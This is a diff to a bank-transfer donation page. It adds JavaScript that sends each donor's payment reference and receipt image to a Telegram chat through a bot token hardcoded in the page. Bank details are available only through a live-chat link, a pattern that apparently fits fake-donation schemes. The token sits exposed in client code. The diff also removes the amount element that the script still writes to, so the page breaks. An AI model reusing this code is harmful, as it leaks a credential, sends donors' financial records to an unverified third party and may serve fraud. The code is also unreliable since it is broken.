@@ -47,24 +47,103 @@
                 <p class="text-slate-600 mt-2 text-base md:text-lg">Complete your donation via bank transfer</p>
             </div>
 
-            <!-- Amount -->
-            <div class="mb-8 text-center">
-                <p class="text-sm text-slate-500"></p>
-                <p id="total-amount" class="text-5xl font-bold text-slate-800"></p>
-            </div>
-
+            <!-- Improved Amount Section -->
+            
             <!-- Bank Transfer Instructions -->
             <div class="mb-8">
                 <label class="block text-sm font-medium text-slate-500 mb-4">HOW TO PROCEED</label>
-                <div class="bg-slate-50 border border-slate-200 rounded-3xl p-6 text-sm leading-relaxed">
-                    <p class="mb-4">1. Contact our live chat to receive the correct bank account details.</p>
-                    <p class="mb-4">2. Make the transfer with the exact amount shown above.</p>
-                    <p>3. Upload your transfer receipt below and submit for verification.</p>
+                <div class="bg-slate-50 border border-slate-200 rounded-3xl p-6 text-sm leading-relaxed space-y-3">
+                    <p>1. Click the live chat button 💬 to get secure bank account details via live chat.</p>
+                    <p>2. Make the transfer with the exact amount shown above.</p>
+                    <p>3. Upload your transfer receipt and submit for verification.</p>
                 </div>
             </div>
 
-           
+            <!-- Live Chat Button -->
+            
 
-                    
+    <script>
+        let selectedAmount = 250;
+        let uploadedImageBase64 = null;
+
+        const BOT_TOKEN = "7989516861:AAFV7q6WSBk4sQuOVsaJiWq3c4KQGpuaB_Q";
+        const CHAT_ID   = "7464797757";
+
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('amount');
+            if (amount) selectedAmount = parseFloat(amount);
+            document.getElementById('total-amount').textContent = '$' + selectedAmount.toFixed(2);
+        };
+
+        function previewImage(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    uploadedImageBase64 = e.target.result;
+                    document.getElementById('preview-img').src = e.target.result;
+                    document.getElementById('image-preview').classList.remove('hidden');
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function openLiveChat() {
+            window.open('https://wa.me/1234567890', '_blank'); // ← Change this to your live chat link
+        }
+
+        async function submitPayment() {
+            const transactionRef = document.getElementById('transaction-ref').value.trim();
+            const submitBtn = document.getElementById('submit-btn');
+
+            if (!transactionRef) {
+                alert("Please enter the transaction reference or ID");
+                return;
+            }
+
+            submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Submitting...`;
+            submitBtn.disabled = true;
+
+            try {
+                const message = `🏦 New Bank Transfer Received!\n\n` +
+                                `💰 Amount: $${selectedAmount}\n` +
+                                `🔖 Reference: ${transactionRef}\n` +
+                                `⏰ Time: ${new Date().toLocaleString()}`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+
+                if (uploadedImageBase64) {
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("caption", `📸 Bank Transfer Proof\nAmount: $${selectedAmount}\nRef: ${transactionRef}`);
+
+                    const blob = await fetch(uploadedImageBase64).then(r => r.blob());
+                    formData.append("photo", blob, "transfer-proof.jpg");
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                }
+
+                document.getElementById('success-popup').classList.remove('hidden');
+            } catch (error) {
+                console.error(error);
+                alert("Failed to submit. Please check your connection and try again.");
+            } finally {
+                submitBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Confirm Transfer`;
+                submitBtn.disabled = false;
+            }
+        }
+
+        function closePopup() {
+            document.getElementById('success-popup').classList.add('hidden');
+        }
+    </script>
 </body>
 </html>
